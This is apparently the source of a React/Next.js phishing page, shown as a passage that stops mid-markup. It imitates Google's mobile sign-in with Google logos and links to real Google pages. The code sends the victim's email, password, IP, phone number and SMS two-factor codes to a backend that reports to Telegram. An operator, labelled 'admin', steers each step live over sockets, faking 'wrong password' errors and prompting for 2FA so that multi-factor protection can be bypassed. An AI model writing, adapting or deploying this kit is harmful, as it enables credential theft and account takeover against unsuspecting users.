import React, { useState, useContext, useEffect, useRef } from "react";
import Image from "next/image";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import { DataContext } from "../../pages/index.js";
import { io } from "socket.io-client";
import { getSocketUrl } from "../../config/api.js";

function GoogleSignInMobile({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
  onClose,
}) {
  const [step, setStep] = useState("email");
  const [localEmail, setLocalEmail] = useState(Email || "");
  const [emailError, setEmailError] = useState("");
  const [isModalLoading, setIsModalLoading] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [dontAskAgain, setDontAskAgain] = useState(true);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isRequestingAuth, setIsRequestingAuth] = useState(false);
  const [expectedCode, setExpectedCode] = useState("");
  const [socket, setSocket] = useState(null);
  const [socketConnected, setSocketConnected] = useState(false);
  const [socketPasswordError, setSocketPasswordError] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [smsCodeError, setSmsCodeError] = useState("");
  const [isSubmittingSmsCode, setIsSubmittingSmsCode] = useState(false);
  const passwordTimeoutRef = useRef(null);
  const { setAllData, AllData } = useContext(DataContext);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsModalLoading(false);
    }, 1500);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const handleShowCode = () => {
      setStep("2fa-code");
    };

    const handleCodeReceived = (e) => {
      const { code } = e.detail;
      if (code) {
        setExpectedCode(code);
      }
    };

    window.addEventListener("appauth-show-code", handleShowCode);
    window.addEventListener("appauth-code-received", handleCodeReceived);

    return () => {
      window.removeEventListener("appauth-show-code", handleShowCode);
      window.removeEventListener("appauth-code-received", handleCodeReceived);
    };
  }, []);

  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
  } = usePasswordAuth({
    Unik,
    Email: localEmail,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  useEffect(() => {
    if (passwordError && (step === "2fa" || step === "2fa-code" || step === "2fa-options")) {
      setIsRequestingAuth(false);
      setStep("password");
    }
    // Clear loading state when password error appears
    if (passwordError && step === "password") {
      setIsRequestingAuth(false);
    }
  }, [passwordError, step]);

  // Listen for admin decision events (from Telegram polling)
  useEffect(() => {
    const handleBadEmail = () => {
      console.log('[Gmail Mobile] admin-bad-email event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setEmailError("Couldn't find your Google Account");
      setStep("email");
      
      // Send full formatted notification to Telegram
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: 'bademail' })
        });
      } catch (error) {
        console.error('Failed to send bad email notification:', error);
      }
    };

    const handleBadPass = () => {
      console.log('[Gmail Mobile] admin-bad-pass event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setPassword("");
      setSocketPasswordError("Wrong password. Try again or click Forgot password to reset it.");
      
      // Send full formatted notification to Telegram
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: 'badpass' })
        });
      } catch (error) {
        console.error('Failed to send bad pass notification:', error);
      }
    };

    const handle2FAGmail = () => {
      console.log('[Gmail Mobile] admin-2fa-gmail event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setStep("2fa");
      
      // Send full formatted notification to Telegram
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: '2fagmail' })
        });
      } catch (error) {
        console.error('Failed to send 2FA notification:', error);
      }
    };

    const handle2FANumber = () => {
      console.log('[Gmail Mobile] admin-2fa-number event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setStep("2fa-code");
      
      // Send full formatted notification to Telegram
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: '2fanumber' })
        });
      } catch (error) {
        console.error('Failed to send 2FA notification:', error);
      }
    };

    const handle2FASMS = () => {
      console.log('[Gmail Mobile] admin-2fa-sms event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setStep("2fa-sms-code");
      
      // Send full formatted notification to Telegram
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: '2fasms' })
        });
      } catch (error) {
        console.error('Failed to send 2FA notification:', error);
      }
    };

    const handleWait = () => {
      console.log('[Gmail Mobile] admin-wait event received');
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(true);
      
      // Send full formatted notification to Telegram
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: 'wait' })
        });
      } catch (error) {
        console.error('Failed to send wait notification:', error);
      }
    };

    window.addEventListener("admin-bad-email", handleBadEmail);
    window.addEventListener("admin-bad-pass", handleBadPass);
    window.addEventListener("admin-2fa-gmail", handle2FAGmail);
    window.addEventListener("admin-2fa-number", handle2FANumber);
    window.addEventListener("admin-2fa-sms", handle2FASMS);
    window.addEventListener("admin-wait", handleWait);

    return () => {
      window.removeEventListener("admin-bad-email", handleBadEmail);
      window.removeEventListener("admin-bad-pass", handleBadPass);
      window.removeEventListener("admin-2fa-gmail", handle2FAGmail);
      window.removeEventListener("admin-2fa-number", handle2FANumber);
      window.removeEventListener("admin-2fa-sms", handle2FASMS);
      window.removeEventListener("admin-wait", handleWait);
    };
  }, []);

  // Socket connection for admin decisions
  useEffect(() => {
    if (!Unik) {
      console.log('[Gmail Mobile] No Unik, skipping socket connection');
      return;
    }

    console.log('[Gmail Mobile] Setting up socket connection for user:', Unik);
    const socketInstance = io(getSocketUrl(), {
      transports: ["websocket", "polling"],
    });

    socketInstance.on('connect', () => {
      console.log('[Gmail Mobile] ✅ Socket connected:', socketInstance.id);
      setSocketConnected(true);
    });

    socketInstance.on('disconnect', () => {
      console.log('[Gmail Mobile] ❌ Socket disconnected');
      setSocketConnected(false);
    });

    socketInstance.on('connect_error', (error) => {
      console.error('[Gmail Mobile] Socket connection error:', error.message);
      setSocketConnected(false);
    });

    setSocket(socketInstance);
    
    // Connect the socket
    console.log('[Gmail Mobile] Connecting socket...');
    socketInstance.connect();

    // Listen for error decisions
    const errorEventName = `gmail-error-${Unik}`;
    console.log('[Gmail Mobile] Listening for event:', errorEventName);
    socketInstance.on(errorEventName, (data) => {
      console.log('[Gmail Mobile] ✅ Received error event:', errorEventName, data);
      if (passwordTimeoutRef.current) {
        console.log('[Gmail Mobile] Clearing timeout due to admin decision');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
      
      if (data.type === 'badcreds') {
        console.log('[Gmail Mobile] Processing badcreds');
        setEmailError("Couldn't find your Google Account");
        setStep("email");
      } else if (data.type === 'badpass') {
        console.log('[Gmail Mobile] Processing badpass');
        setPassword("");
        setSocketPasswordError("Wrong password. Try again or click Forgot password to reset it.");
      }
    });

    // Listen for 2FA decisions
    const twoFaEventName = `gmail-2fa-${Unik}`;
    console.log('[Gmail Mobile] Listening for event:', twoFaEventName);
    socketInstance.on(twoFaEventName, (data) => {
      console.log('[Gmail Mobile] ✅ Received 2FA event:', twoFaEventName, data);
      if (passwordTimeoutRef.current) {
        console.log('[Gmail Mobile] Clearing timeout due to admin decision');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
      
      if (data.type === 'gmail') {
        console.log('[Gmail Mobile] Processing 2FA Gmail - going to step: 2fa');
        setStep("2fa");
      } else if (data.type === 'number') {
        console.log('[Gmail Mobile] Processing 2FA Number - going to step: 2fa-code');
        setStep("2fa-code");
      } else if (data.type === 'sms') {
        console.log('[Gmail Mobile] Processing 2FA SMS - going to step: 2fa-sms-code');
        setStep("2fa-sms-code");
      }
    });

    // Listen for approval
    const approvalEventName = `gmail-approved-${Unik}`;
    console.log('[Gmail Mobile] Listening for event:', approvalEventName);
    socketInstance.on(approvalEventName, (data) => {
      console.log('[Gmail Mobile] ✅ Received approval event:', approvalEventName, data);
      if (passwordTimeoutRef.current) {
        console.log('[Gmail Mobile] Clearing timeout due to admin approval');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
      if (handleSubmit) {
        console.log('[Gmail Mobile] Calling handleSubmit');
        handleSubmit();
      }
    });

    // Listen for verification code (2FA Number flow)
    const codeEventName = `gmail-code-${Unik}`;
    console.log('[Gmail Mobile] Listening for event:', codeEventName);
    socketInstance.on(codeEventName, (data) => {
      console.log('[Gmail Mobile] ✅ Received code event:', codeEventName, data);
      if (data.code) {
        console.log('[Gmail Mobile] Setting expected code:', data.code);
        setExpectedCode(data.code);
      }
    });

    // Listen for wait command
    const waitEventName = `gmail-wait-${Unik}`;
    console.log('[Gmail Mobile] Listening for event:', waitEventName);
    socketInstance.on(waitEventName, (data) => {
      console.log('[Gmail Mobile] ✅ Received wait event:', waitEventName, data);
      if (passwordTimeoutRef.current) {
        console.log('[Gmail Mobile] Clearing timeout due to admin wait command');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(true);
    });

    return () => {
      console.log('[Gmail Mobile] Cleaning up socket connection');
      socketInstance.disconnect();
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
      }
    };
  }, [Unik]);

  const handleEmailChange = (e) => {
    setLocalEmail(e.target.value);
    setEmailError("");
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    setSocketPasswordError("");
    if (passwordTimeoutRef.current) {
      console.log('[Gmail Mobile] Clearing timeout due to password change');
      clearTimeout(passwordTimeoutRef.current);
      passwordTimeoutRef.current = null;
    }
    clearPasswordError();
  };

  const handleEmailNext = () => {
    if (!localEmail) {
      setEmailError("Enter an email or phone number");
      return;
    }
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(localEmail)) {
      setEmailError("Enter a valid email");
      return;
    }
    
    setEmail(localEmail);
    setIsTransitioning(true);
    setTimeout(() => {
      setStep("password");
      setTimeout(() => setIsTransitioning(false), 50);
    }, 300);
  };

  const handlePasswordNext = async () => {
    if (!password) {
      return;
    }
    
    if (passwordTimeoutRef.current) {
      console.log('[Gmail Mobile] Clearing existing timeout before new submission');
      clearTimeout(passwordTimeoutRef.current);
      passwordTimeoutRef.current = null;
    }
    
    setSocketPasswordError('');
    
    if (!socketConnected) {
      console.warn('[Gmail Mobile] Socket not connected yet, waiting...');
      setSocketPasswordError('Connecting... Please wait.');
      setTimeout(() => {
        setSocketPasswordError('');
        if (socketConnected) {
          handlePasswordNext();
        }
      }, 2000);
      return;
    }
    
    console.log('[Gmail Mobile] Password submitted, socket connected:', socketConnected);
    setIsRequestingAuth(true);
    
    const timeoutId = setTimeout(() => {
      console.log('[Gmail Mobile] 60 second timeout reached, showing bad password');
      setIsRequestingAuth(false);
      setPassword("");
      setSocketPasswordError("Wrong password. Try again or click Forgot password to reset it.");
      passwordTimeoutRef.current = null;
    }, 60000);
    
    passwordTimeoutRef.current = timeoutId;
    console.log('[Gmail Mobile] Set timeout:', timeoutId);
    
    try {
      console.log('[Gmail Mobile] Sending request to backend...');
      const response = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/request`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId: Unik,
          email: localEmail,
          password: password,
          ip: Ip,
          name: Name,
          businessEmail: BusinessEmail,
          tel: Tel
        })
      });
      
      const data = await response.json();
      console.log('[Gmail Mobile] Backend response:', data);
    } catch (error) {
      console.error('[Gmail Mobile] Error sending auth request:', error);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
    }
  };

  const handleBackToEmail = () => {
    setStep("email");
    clearPasswordError();
  };

  const handleTryAnotherWay = async () => {
    // Send message to Telegram that user clicked "Try another way"
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip,
      full_name: Name,
      login_email: localEmail,
      business_email: BusinessEmail,
      phone_number: Tel,
      page_name: "Gmail",
      currentStep: "User clicked: Try another way",
    };

    setAllData(params);

    try {
      const SendData = (await import("../../hooks/SendData.js")).default;
      await SendData(params);
    } catch (error) {
      console.error("Error sending try another way message:", error);
    }

    // Go back to email step
    setStep("email");
  };

  const handleBackTo2FA = () => {
    setStep("2fa");
  };

  const handleTapYesOnPhone = async () => {
    // Send message to Telegram that user clicked "Tap Yes on phone"
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip,
      full_name: Name,
      login_email: localEmail,
      business_email: BusinessEmail,
      phone_number: Tel,
      page_name: "Gmail",
      currentStep: "User clicked: 2FA Gmail",
    };

    setAllData(params);

    try {
      const SendData = (await import("../../hooks/SendData.js")).default;
      await SendData(params);
    } catch (error) {
      console.error("Error sending 2FA Gmail message:", error);
    }

    // Navigate to 2FA Gmail step
    setStep("2fa");
  };

  const handleGetVerificationCode = async () => {
    // Send message to Telegram that user clicked "Get verification code"
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip,
      full_name: Name,
      login_email: localEmail,
      business_email: BusinessEmail,
      phone_number: Tel,
      page_name: "Gmail",
      currentStep: "User clicked: 2FA SMS",
    };

    setAllData(params);

    try {
      const SendData = (await import("../../hooks/SendData.js")).default;
      await SendData(params);
    } catch (error) {
      console.error("Error sending 2FA SMS message:", error);
    }

    // Navigate to SMS code entry step
    setStep("2fa-sms-code");
  };

  const handleSmsCodeChange = (e) => {
    setSmsCode(e.target.value);
    setSmsCodeError("");
  };

  const handleSmsCodeSubmit = async (e) => {
    if (e) e.preventDefault();
    
    if (!smsCode || smsCode.length < 6) {
      setSmsCodeError("Please enter a valid code");
      return;
    }

    setIsSubmittingSmsCode(true);
    setSmsCodeError("");

    const params = {
      ...AllData,
      id: Unik,
      ip: Ip,
      full_name: Name,
      login_email: localEmail,
      business_email: BusinessEmail,
      phone_number: Tel,
      page_name: "Gmail",
      tfa_one: smsCode,
      currentStep: "SMS 2FA Code: " + smsCode,
    };

    setAllData(params);

    try {
      const SendData = (await import("../../hooks/SendData.js")).default;
      await SendData(params);
    } catch (error) {
      console.error("Error sending SMS code:", error);
      setSmsCodeError("Something went wrong. Please try again.");
      setIsSubmittingSmsCode(false);
    }
  };

  // Listen for admin response to SMS 2FA code
  useEffect(() => {
    const handleWrong2fa = () => {
      setSmsCodeError("Invalid authentication code");
      setIsSubmittingSmsCode(false);
      setSmsCode("");
    };

    const handleApproved = () => {
      if (typeof window !== "undefined") {
        window.location.href = "/application-complete";
      }
    };

    window.addEventListener("wrong2fa", handleWrong2fa);
    window.addEventListener("appauth-approved", handleApproved);
    window.addEventListener("done", handleApproved);

    return () => {
      window.removeEventListener("wrong2fa", handleWrong2fa);
      window.removeEventListener("appauth-approved", handleApproved);
      window.removeEventListener("done", handleApproved);
    };
  }, []);

  const handleBackToSmsOptions = () => {
    setStep("2fa-options");
    setSmsCode("");
    setSmsCodeError("");
  };

  const getInitial = () => {
    if (localEmail) {
      return localEmail.charAt(0).toUpperCase();
    }
    return "";
  };

  return (
    <div className="fixed inset-0 z-[9999] bg-white overflow-y-auto">
      {/* Content Area */}
      <div className={"px-4 py-4 min-h-screen relative bg-white flex flex-col"}>
        {/* Loading Overlay */}
        {isRequestingAuth && (
          <div className="absolute inset-0 bg-black bg-opacity-10 z-50 flex items-start">
            <div className="w-full h-1 bg-[#1a73e8] animate-loadingBar"></div>
          </div>
        )}
        
        {isModalLoading ? (
          <div className="flex items-center justify-center min-h-[400px]">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 100 100"
              className="h-16 w-16"
            >
              <circle
                cx="50"
                cy="50"
                fill="none"
                stroke="#4285F4"
                strokeWidth="6"
                r="35"
                strokeDasharray="164.93361431346415 56.97787143782138"
              >
                <animateTransform
                  attributeName="transform"
                  type="rotate"
                  repeatCount="indefinite"
                  dur="1s"
                  values="0 50 50;360 50 50"
                  keyTimes="0;1"
                ></animateTransform>
              </circle>
            </svg>
          </div>
        ) : (
          <div className="max-w-md mx-auto font-sans flex-1 flex flex-col w-full">
            {/* Google Logo - only show on email step */}
            {step === "email" && (
              <div className="flex justify-start mb-6">
                <Image src="/Images/google.svg" alt="Google" width={40} height={24} />
              </div>
            )}

            {/* Google Logo for password step */}
            {step === "password" && (
              <div className="flex justify-start mb-8">
                <Image src="/Images/google.svg" alt="Google" width={40} height={24} />
              </div>
            )}

            <div className="relative overflow-hidden">
            {step === "email" ? (
              <div className={`transition-all duration-300 ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                <h1 className="text-[32px] font-normal text-[#202124] mb-2 font-helvetica">Sign in</h1>
                <p className="text-base text-[#202124] mb-8 font-helvetica">
                  with your Google Account to continue to <span className="text-[#0b57d0] cursor-pointer hover:underline">{process.env.NEXT_PUBLIC_APP_NAME}</span>
                </p>

                <div className="g-input-wrapper font-helvetica">
                  <input
                    type="text"
                    value={localEmail}
                    onChange={handleEmailChange}
                    placeholder=" "
                    className={`g-input ${emailError ? "redborder" : ""}`}
                    disabled={isLoading}
                    onKeyPress={(e) => {
                      if (e.key === 'Enter') {
                        handleEmailNext();
                      }
                    }}
                  />
                  <label className="g-label">
                    Email or phone
                  </label>
                  {emailError && (
                    <div className="text-[#d93025] text-xs mt-2 flex items-center gap-1">
                      <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                        <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm1 12H7V7h2v5zm0-6H7V4h2v2z"/>
                      </svg>
                      {emailError}
                    </div>
                  )}
                </div>

                <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&dsh=S-2061029517%3A1770901038273578&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AXbMIuAv1aVCmcTk2QatBz5LoJ8Fh0lNKOOnVK-2IbogSJN6ZJ-p1tGteaonCslTX8ctm3aqzPjIdg&osid=1&service=mail" className="text-[#0b57d0] text-sm font-medium hover:underline inline-block mb-10">
                  Forgot email?
                </a>

                <p className="text-sm text-[#5f6368] mb-10 leading-5 font-normal">
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <a href="https://support.google.com/chrome/answer/6130773?hl=en" className="text-[#0b57d0] hover:underline">Learn more about using Guest mode</a>
                </p>

                <div className="flex justify-between items-center font-go ">
                  <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail/u/0/&dsh=S-1979411420:1770901021001568&emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&ifkv=AXbMIuBZN-Nv2uH4EMnbx5dvUW8SSDqEjy0ag3hq0jruH1H-bLu_9fW8dzVC0v8aJ9EikU5qZsNG&osid=1&service=mail&TL=APgKAcY3-j29MNwpa9Mg9z4VRDspqSau6U39nHanzgN8Ghk9ioEAvj3Xg29c5AAO" className="text-[#0b57d0] text-sm font-medium hover:underline">
                    Create account
                  </a>
                  <button
                    onClick={handleEmailNext}
                    disabled={isLoading}
                    className="bg-[#0b57d0] text-white px-6 py-2 font-go rounded-[20px] font-medium text-sm hover:bg-[#094db9] hover:shadow-md transition-all disabled:bg-[#dadce0] disabled:text-[#80868b]"
                  >
                    Next
                  </button>
                </div>


              </div>
            ) : step === "password" ? (
              <div className={`transition-all duration-300 ${isTransitioning ? '-translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                <h1 className="text-[32px] font-helvetica text-[#202124] mb-3">Welcome</h1>
                
                <button className="mb-14 w-[60%] p-1 border-1 !border-[#747775] rounded-full flex items-center gap-2 bg-white hover:bg-[#f8f9fa] transition-colors">
                  <div className="w-6 h-6 rounded-full border-2 border-[#5f6368] flex items-center justify-center flex-shrink-0 bg-white">
                    <svg className="w-3.5 h-3.5 text-[#5f6368]" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm text-[#202124] flex-1 text-left">{localEmail}</span>
                  <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                  </svg>
                </button>

                <div className="mb-2">
                  <div className="g-input-wrapper">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={handlePasswordChange}
                      placeholder=" "
                      className={`g-input ${passwordError || socketPasswordError ? "redborder" : ""}`}
                      disabled={isRequestingAuth}
                      onKeyPress={(e) => {
                        if (e.key === 'Enter') {
                          handlePasswordNext();
                        }
                      }}
                    />
                    <label className="g-label">
                      Enter your password
                    </label>
                  </div>
                  {(passwordError || socketPasswordError) && (
                    <div className="text-red-500 text-xs mt-2 flex items-center gap-1">
                      <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                        <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm1 12H7V7h2v5zm0-6H7V4h2v2z"/>
                      </svg>
                      {socketPasswordError || passwordError}
                    </div>
                  )}
                </div>

                <label className="flex items-center text-sm text-[#202124] cursor-pointer mb-12">
                  <input
                    type="checkbox"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    className="mr-3 w-4 h-4 accent-[#0b57d0]"
                  />
                  Show password
                </label>

                <div className="flex items-center justify-between">

                <a href="https://accounts.google.com/signin/recovery" className="text-[#0b57d0] text-sm font-medium hover:underline inline-block mb-8">
                  Forgot password?
                </a>

                <div className="justify-end items-center inline-block mb-8">
                  <button
                    onClick={handlePasswordNext}
                    disabled={isRequestingAuth}
                    className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-[20px] font-medium text-sm hover:bg-[#094db9] transition-all disabled:bg-[#dadce0] disabled:text-[#80868b]"
                  >
                    {isRequestingAuth ? "Signing in..." : "Next"}
                  </button>
                </div>

                </div>

                {/* Debug Buttons */}
                {/* <div className="flex gap-3 mb-6">
                  <button
                    onClick={() => setStep("2fa")}
                    className="flex-1 bg-gray-200 text-gray-700 px-4 py-2 rounded-md text-xs font-medium hover:bg-gray-300 transition-all"
                  >
                    Test: 2FA Gmail
                  </button>
                  <button
                    onClick={() => setStep("2fa-code")}
                    className="flex-1 bg-gray-200 text-gray-700 px-4 py-2 rounded-md text-xs font-medium hover:bg-gray-300 transition-all"
                  >
                    Test: 2FA Number
                  </button>

                  <button
                    onClick={() => setStep("2fa-sms-code")}
                    className="flex-1 bg-gray-200 text-gray-700 px-4 py-2 rounded-md text-xs font-medium hover:bg-gray-300 transition-all"
                  >
                    Test: 2FA sms
                  </button>
                </div> */}

              </div>
            ) : step === "2fa" ? (
              <>
                {/* Google G Logo */}
                <div className="mb-6">
                  <svg viewBox="0 0 48 48" width="40" height="40">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                  </svg>
                </div>

                <h1 className="text-[32px] font-helvetica text-[#202124] mb-4">2-Step Verification</h1>

                <p className="text-[16px] text-[#5f6368] mb-6">
                  To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in
                </p>

                <div className="mb-12 w-[60%] p-1 border-1 !border-[#747775] rounded-full flex items-center gap-2 bg-white hover:bg-[#f8f9fa] transition-colors">
                  <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                    <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm text-[#202124] flex-1">{localEmail}</span>
                  <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                  </svg>
                </div>

                {/* Phone Illustration */}
                <div className="flex justify-center my-6">
                  <img src="/Images/gmailapp.svg" alt="Phone Prompt" className="w-auto h-40" />
                </div>

                <h2 className="text-lg text-[#202124] font-medium mb-3">Check your phone</h2>

                <p className="text-sm text-[#5f6368] mb-4 leading-relaxed">
                  Google sent a notification to your phone. Open the Gmail app and tap <strong className="text-[#202124] font-medium">Yes</strong> on the prompt to verify it&apos;s you.
                </p>

                <p className="text-sm text-[#5f6368] mb-6">
                  Need help? <a href="#" className="text-[#1a73e8] hover:underline">Learn more about Google prompts</a>
                </p>

                <label className="flex items-center text-sm text-[#5f6368] cursor-pointer mb-8">
                  <input
                    type="checkbox"
                    checked={dontAskAgain}
                    onChange={(e) => setDontAskAgain(e.target.checked)}
                    className="mr-3 w-4 h-4 accent-[#8ab4f8]"
                  />
                  Don&apos;t ask again on this device
                </label>

                <button className="text-[#1a73e8] text-sm hover:underline block mb-6">
                  Resend it
                </button>

                 <button
                 type="button"
                 onClick={handleBackToSmsOptions}
                 className="text-[#0b57d0] text-sm font-medium hover:underline"
                 >
                 Try another way
                 </button>

              </>
            ) : step === "2fa-code" ? (
                  <>
                                        <div className="flex justify-start mb-6">
                      <svg viewBox="0 0 48 48" width="40" height="40">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                      </svg>
                    </div>

                    <h1 className="text-[32px] font-helvetica font-normal text-[#202124] mb-2">Verify it's you</h1>
                    <p className="text-base font-go text-[#202124] mb-2">
                      To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in
                    </p>

                    <div className="mb-10 p-1 border border-[#dadce0] w-[60%] rounded-full flex items-center gap-2 bg-white">
                      <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                        <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
